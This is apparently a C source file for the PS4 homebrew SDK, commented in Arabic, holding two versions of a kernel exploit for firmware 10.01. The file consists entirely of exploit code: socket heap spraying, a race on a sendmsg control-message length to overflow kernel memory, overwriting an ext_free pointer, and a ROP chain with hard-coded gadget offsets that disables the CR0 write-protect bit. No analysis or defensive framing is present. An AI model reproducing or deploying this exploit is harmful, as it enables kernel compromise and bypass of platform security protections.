/*
#include <ps4.h>
//#include "payload_utils.h"

struct msghdr {
    void         *msg_name;
    uint32_t      msg_namelen;
    void         *msg_iov;
    int           msg_iovlen;
    void         *msg_control;
    uint32_t      msg_controllen;
    int           msg_flags;
};

struct cmsghdr {
    uint32_t      cmsg_len;
    int           cmsg_level;
    int           cmsg_type;
};

#define IP_RETOPTS 7
#define CONTROL_LEN 256
#define SPRAY_COUNT 128

struct cmsghdr *cmsg;
uint8_t control_buf[CONTROL_LEN];
int global_sock;
int spray_socks[SPRAY_COUNT];

// استخدام syscall لعملية الـ Push لضمان عدم حدوث خطأ Linker
void push_mbufs() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)
        if(spray_socks[i] > 0) {
            // syscall 133 هو sendto في FreeBSD/PS4
            // sendto(s, buf, len, flags, to, tolen)
            syscall(133, spray_socks[i], "A", 1, 0, NULL, 0);
        }
    }
}

void pop_mbufs() {
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) {
            syscall(6, spray_socks[i]); // close
            spray_socks[i] = -1;
        }
    }
}

void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;

    while(1) {
        syscall(28, global_sock, &msg, 0); // sendmsg
    }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        cmsg->cmsg_len = 0x50;   
        cmsg->cmsg_len = 0xFFFF; 
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();
    initNetwork();

    // جلب القاعدة وحساب عنوان الـ Gadget
    uint64_t kbase = get_kernel_base();
    uint64_t target_gadget = kbase + 0x68B1; // JMP RSI لنسخة 10.01

    global_sock = syscall(97, 2, 2, 0);
    
    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = IP_RETOPTS;
    cmsg->cmsg_len = 0x50;

    // ملء البفر بالعنوان المستهدف لتعديل ext_free عند حدوث الفيضان
    // نملأ مساحة واسعة لزيادة دقة الإصابة في الـ Heap
    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
        *(uint64_t *)(control_buf + i) = target_gadget;
    }

    // تنفيذ عملية ترتيب الذاكرة
    push_mbufs();
    pop_mbufs();

    ScePthread thread1, thread2;
    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");

    // الانتظار - بما أنك مجلبرك، ستعرف أن الكود يعمل عند حدوث Kernel Panic
    // الانهيار يعني أن النواة حاولت تنفيذ الـ Gadget الذي حقنته في ext_free
    scePthreadJoin(thread1, NULL);
    scePthreadJoin(thread2, NULL);

    return 0;
}
*/

#include <ps4.h>

// ملاحظة: تأكد من تضمين "payload_utils.h" إذا كان get_kernel_base معرفاً هناك
// أو استخدم التعريف المباشر عبر MSR كما في الـ SDK.

struct msghdr {
    void         *msg_name;
    uint32_t      msg_namelen;
    void         *msg_iov;
    int           msg_iovlen;
    void         *msg_control;
    uint32_t      msg_controllen;
    int           msg_flags;
};

struct cmsghdr {
    uint32_t      cmsg_len;
    int           cmsg_level;
    int           cmsg_type;
};

#define IP_RETOPTS 7
#define CONTROL_LEN 256
#define SPRAY_COUNT 128

// إزاحات 10.01 المستخرجة من ملف البايثون (مطروح منها القاعدة الثابتة 0x82200000)
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_POP_RSI_RET          0x0983E0
#define OFF_MOV_CR0_RSI_UD2      0x176089
#define OFF_RET                  0x0008E0

struct cmsghdr *cmsg;
uint8_t control_buf[CONTROL_LEN];
int global_sock;
int spray_socks[SPRAY_COUNT];

void push_mbufs() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0); 
        if(spray_socks[i] > 0) {
            syscall(133, spray_socks[i], "A", 1, 0, NULL, 0);
        }
    }
}

void pop_mbufs() {
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) {
            syscall(6, spray_socks[i]); 
            spray_socks[i] = -1;
        }
    }
}

void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) {
        syscall(28, global_sock, &msg, 0); 
    }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        cmsg->cmsg_len = 0x50;   
        cmsg->cmsg_len = 0xFFFF; 
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();
    initNetwork();

    uint64_t kbase = get_kernel_base();

    // 1. بناء الـ ROP Chain لتعطيل حماية الكتابة (CR0 WP bit)
    // نبدأ بوضع السلسلة في البفر
    uint64_t *rop = (uint64_t *)(control_buf + 0x48); 
    int i = 0;

    // Gadget 1: دفع RSP إلى RSI لكي يعرف المعالج أين نحن
    rop[i++] = kbase + OFF_PUSH_RSP_POP_RSI_RET; 
    
    // Gadget 2: سحب القيمة القادمة إلى RSI (قيمة CR0 الجديدة)
    rop[i++] = kbase + OFF_POP_RSI_RET;
    rop[i++] = 0x80040033; // القيمة التي تعطل Write Protection
    
    // Gadget 3: تنفيذ الكتابة في سجل CR0
    rop[i++] = kbase + OFF_MOV_CR0_RSI_UD2;

    // 2. توجيه ext_free إلى أول Gadget في السلسلة
    // سنضع عنوان أول Gadget (PUSH_RSP) في مكان مؤشر الدالة المتوقع
    uint64_t entry_gadget = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    
    global_sock = syscall(97, 2, 2, 0);
    
    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = IP_RETOPTS;
    cmsg->cmsg_len = 0x50;

    // توزيع الـ Entry Gadget لضمان الإصابة
    for (int j = 0x48; j < CONTROL_LEN - 8; j += 8) {
        *(uint64_t *)(control_buf + j) = entry_gadget;
    }

    // إعادة بناء الـ ROP داخل البفر بعد الـ memset
    i = 0;
    rop[i++] = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    rop[i++] = kbase + OFF_POP_RSI_RET;
    rop[i++] = 0x80040033; 
    rop[i++] = kbase + OFF_MOV_CR0_RSI_UD2;

    push_mbufs();
    pop_mbufs();

    ScePthread thread1, thread2;
    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(thread1, NULL);
    scePthreadJoin(thread2, NULL);

    return 0;
}
